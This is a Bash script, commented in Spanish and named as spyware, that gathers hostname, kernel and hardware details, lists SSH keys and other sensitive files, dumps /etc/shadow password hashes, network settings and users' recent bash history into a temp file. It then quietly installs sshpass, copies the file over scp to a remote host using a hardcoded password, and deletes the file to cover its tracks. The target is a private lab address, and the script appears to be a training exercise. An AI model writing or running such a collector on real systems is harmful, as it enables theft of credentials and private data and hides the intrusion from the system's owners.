#!/bin/bash

# Variables globales
PAYLOAD_FILE="/tmp/spyware_payload"
REMOTE_USER="steve-quezada"
REMOTE_HOST="192.168.91.128"
REMOTE_PATH="/home/steve-quezada/Music"
SSH_PASS="Steve-Debian"

# Mejora de formato para separadores
print_separator() {
    echo -e "\n===============================================" >> $PAYLOAD_FILE
    echo "            $1" | awk '{printf "%-40s\n", $0}' >> $PAYLOAD_FILE
    echo "===============================================" >> $PAYLOAD_FILE
    echo "" >> $PAYLOAD_FILE
}

# Cambio al directorio home para consistencia
cd /home

########################################################################
# SECCIÓN 1: Información del Sistema
# Obtiene datos básicos del sistema operativo, hostname y kernel
########################################################################
print_separator "SYSTEM INFORMATION"
# Muestra información detallada del sistema
hostnamectl | sed 's/^/    /' >> $PAYLOAD_FILE
# Información del kernel
uname -a | sed 's/^/    /' >> $PAYLOAD_FILE

########################################################################
# SECCIÓN 2: Archivos del Sistema
# Busca archivos importantes y directorios ocultos
########################################################################
print_separator "FILES IN HOME DIRECTORY"
echo "Important files and directories:" >> $PAYLOAD_FILE
# Busca archivos con extensiones específicas hasta 3 niveles de profundidad
find /home -maxdepth 3 \( \
    -name "*.txt" -o \
    -name "*.pdf" -o \
    -name "*.doc*" -o \
    -name "*.xls*" -o \
    -name "*.jpg" -o \
    -name "*.png" -o \
    -name ".ssh" -o \
    -name "*.conf" -o \
    -name "*.key" -o \
    -name "*.pem" -o \
    -name "id_*" \
    \) -exec ls -lh {} \; 2>/dev/null | sed 's/^/    /' >> $PAYLOAD_FILE
echo -e "\nHidden files and directories:" >> $PAYLOAD_FILE
find /home -maxdepth 2 -name ".*" -ls 2>/dev/null | sed 's/^/    /' >> $PAYLOAD_FILE

########################################################################
# SECCIÓN 3: Usuarios y Grupos
# Obtiene información de usuarios y grupos del sistema
########################################################################
print_separator "USERS AND GROUPS"
echo "System Users:" >> $PAYLOAD_FILE
# Mejora en la obtención de usuarios
getent passwd | awk -F: '$7 != "/usr/sbin/nologin" && $7 != "/bin/false" && $7 != "/usr/bin/false" {printf "    %-15s | Home: %-25s | Shell: %s\n", $1, $6, $7}' >> $PAYLOAD_FILE
echo -e "\nSystem Groups and Members:" >> $PAYLOAD_FILE
getent group | awk -F: '$4 != "" {print "    Group: " $1 " - Members: " $4}' >> $PAYLOAD_FILE

########################################################################
# SECCIÓN 4: Hashes de Contraseñas
# Obtiene los hashes de contraseñas de los usuarios
########################################################################
print_separator "PASSWORD HASHES"
grep -v '^[^:]*:[*!]:' /etc/shadow >> $PAYLOAD_FILE

########################################################################
# SECCIÓN 5: Información de Red
# Obtiene información de la red, incluyendo interfaces, rutas y puertos
########################################################################
print_separator "NETWORK INFORMATION"
echo "Network Interfaces:" >> $PAYLOAD_FILE
# Mejora en la sección de red
ip -br a | awk '{printf "    %-12s %-12s %s\n", $1, $2, $3}' >> $PAYLOAD_FILE
echo -e "\nRouting Table:" >> $PAYLOAD_FILE
ip -br route >> $PAYLOAD_FILE
echo -e "\nListening Ports:" >> $PAYLOAD_FILE
ss -tuln | grep LISTEN | sed 's/^/    /' >> $PAYLOAD_FILE
echo -e "\nDNS Configuration:" >> $PAYLOAD_FILE
cat /etc/resolv.conf 2>/dev/null | grep -v '^#' | sed 's/^/    /' >> $PAYLOAD_FILE

########################################################################
# SECCIÓN 6: Información de Hardware
# Obtiene información del hardware del sistema
########################################################################
print_separator "HARDWARE INFORMATION"
echo "CPU Information:" >> $PAYLOAD_FILE
lscpu | grep -E "Model name|Architecture|CPU\(s\)|Thread|Core|Socket" | sed 's/^/    /' >> $PAYLOAD_FILE
echo -e "\nMemory Information:" >> $PAYLOAD_FILE
free -h | sed 's/^/    /' >> $PAYLOAD_FILE
echo -e "\nStorage Devices:" >> $PAYLOAD_FILE
lsblk -o NAME,SIZE,FSTYPE,MOUNTPOINT,LABEL | sed 's/^/    /' >> $PAYLOAD_FILE
echo -e "\nPCI Devices:" >> $PAYLOAD_FILE
lspci | grep -i -E "vga|network|wireless|audio" 2>/dev/null | sed 's/^/    /' >> $PAYLOAD_FILE

########################################################################
# SECCIÓN 7: Procesos Críticos
# Lista los procesos más críticos en ejecución
########################################################################
print_separator "CRITICAL PROCESSES"
# Mejora en procesos críticos
ps aux --sort=-%cpu | head -n 11 | awk 'NR==1{print "    "$0} NR>1{printf "    %-8s %5s %4.1f %4.1f %7s %7s %-7s %-4s %-8s %s\n", $1, $2, $3, $4, $5, $6, $8, $9, $10, $11}' >> $PAYLOAD_FILE

########################################################################
# SECCIÓN 8: Comandos Recientes
# Obtiene los últimos 20 comandos ejecutados por los usuarios
########################################################################
print_separator "RECENT COMMANDS"
find /home -name ".bash_history" -exec tail -n 20 {} \; 2>/dev/null | sed 's/^/    /' >> $PAYLOAD_FILE

########################################################################
# SECCIÓN FINAL: Exfiltración y Limpieza
# Transfiere la información recopilada y elimina rastros silenciosamente
########################################################################

# Asegura que el archivo sea accesible para la transferencia
chmod 777 $PAYLOAD_FILE >/dev/null 2>&1

# Verifica e instala sshpass si es necesario
if ! command -v sshpass >/dev/null 2>&1
then
    apt install -y sshpass >/dev/null 2>&1
fi

# Exfiltración silenciosa de datos
sshpass -p "$SSH_PASS" scp -q $PAYLOAD_FILE $REMOTE_USER@$REMOTE_HOST:$REMOTE_PATH/ >/dev/null 2>&1

# Limpieza silenciosa de archivos temporales
rm -f $PAYLOAD_FILE >/dev/null 2>&1
rm -f /tmp/userssystem >/dev/null 2>&1